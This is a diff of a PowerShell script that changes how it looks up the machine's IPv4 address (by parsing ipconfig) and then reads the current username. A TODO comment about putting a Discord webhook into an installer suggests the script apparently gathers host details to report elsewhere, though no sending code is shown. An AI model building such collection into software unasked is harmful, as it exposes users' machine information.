@@ -2,23 +2,19 @@
 # TODO: Need to implement VPS, Fix textfile format, Make the DiscordWebhook in Installer instead
 
 # Get IPv4 address of the machine
-# Attempt to get IPv4 address using Get-NetIPAddress
-$IPAddress = Get-NetIPAddress |
-    Where-Object { $_.AddressFamily -eq "IPv4" -and ($_.InterfaceAlias -match "Wi-Fi|Wireless|Ethernet|Local Area Connection") } |
-    Select-Object -ExpandProperty IPAddress
-
-# Check if $IPAddress is null or empty
-if ([string]::IsNullOrEmpty($IPAddress)) {
-    # If Get-NetIPAddress didn't return an address, try using ipconfig
-    $ipAddressString = "IPv4 Address"
-    Write-Host "Network Connection Test"
-    $ipconfigOutput = ipconfig
-    $ipv4Address = $ipconfigOutput | Select-String -Pattern $ipAddressString | ForEach-Object { $_.ToString() -split ':' } | ForEach-Object { $_.Trim() } | Select-Object -Last 1
+# Define the string to look for in ipconfig output
+$ipAddressString = "IPv4 Address"
+# Use ipconfig to retrieve the IP address
+$ipconfigOutput = ipconfig
+$ipv4Address = $ipconfigOutput | Select-String -Pattern $ipAddressString | ForEach-Object { $_.ToString() -split ':' } | ForEach-Object { $_.Trim() } | Select-Object -Last 1
+# Check if $ipv4Address is null or empty
+if ([string]::IsNullOrEmpty($ipv4Address)) {
+    Write-Host "IPv4 address not found."
+} else {
     Write-Host "Your IP Address is: $ipv4Address"
     $IPAddress = $ipv4Address
-} else {
-    Write-Host "IPv4 Address: $IPAddress"
 }
+
 
 # Get the current user's username
 $Username = $env:USERNAME
